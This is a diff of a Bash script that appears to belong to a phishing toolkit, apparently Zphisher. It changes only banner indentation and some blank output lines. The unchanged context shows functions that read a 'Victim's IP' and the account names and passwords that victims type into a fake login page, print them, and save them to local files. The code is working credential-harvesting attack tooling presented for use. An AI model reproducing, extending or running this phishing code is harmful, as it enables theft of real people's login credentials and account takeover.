@@ -51,13 +51,13 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE} 	▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
-		${ORANGE} 	█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
-		${ORANGE} 	██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
-		${ORANGE} 	█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
-		${ORANGE} 	▀███▀             █       █   ▐               █  ▀███▀     █   
+		${ORANGE}  ▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
+		${ORANGE}  █▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
+		${ORANGE}  ██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
+		${ORANGE}  █▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
+		${ORANGE}  ▀███▀             █       █   ▐               █  ▀███▀     █   
 		${ORANGE}                                                                 
-                                ${WHITE} 			v1.1
+                                ${WHITE} 		v1.1
 	EOF
 }
 
@@ -202,19 +202,16 @@ setup_site() {
 ## Get IP address
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-	echo -e "\n"
 	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${MAGENTA}$IP"
 	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Saved in: ${BLUE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
-	echo -e "\n"
-	echo -e "${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
-	echo -e "\n"
 	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Account : ${MAGENTA}$ACCOUNT"
 	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password : ${MAGENTA}$PASSWORD"
 	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Saved in : ${BLUE}usernames.dat"
